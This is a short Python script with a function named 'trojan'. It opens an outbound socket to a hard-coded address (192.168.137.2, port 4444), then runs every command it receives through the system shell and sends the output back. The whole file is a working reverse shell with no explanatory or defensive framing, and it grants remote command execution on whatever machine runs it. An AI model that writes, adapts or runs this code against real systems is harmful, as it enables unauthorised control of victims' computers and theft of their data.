import socket
import subprocess
import sys

def trojan(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target_ip, target_port))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    print(f"[+] Connected to {target_ip}:{target_port}")

    while True:
        try:
            cmd = s.recv(4096).decode().strip()
            if not cmd:
                break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            output = result.stdout + result.stderr
            s.sendall(output.encode() if output else b"(no output)\n")
        except subprocess.TimeoutExpired:
            s.sendall(b"[!] Command timeout\n")
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    s.close()
    print("[-] Disconnected")


if __name__ == "__main__":
    target_ip = "192.168.137.2"
    target_port = 4444
    trojan(target_ip, target_port)
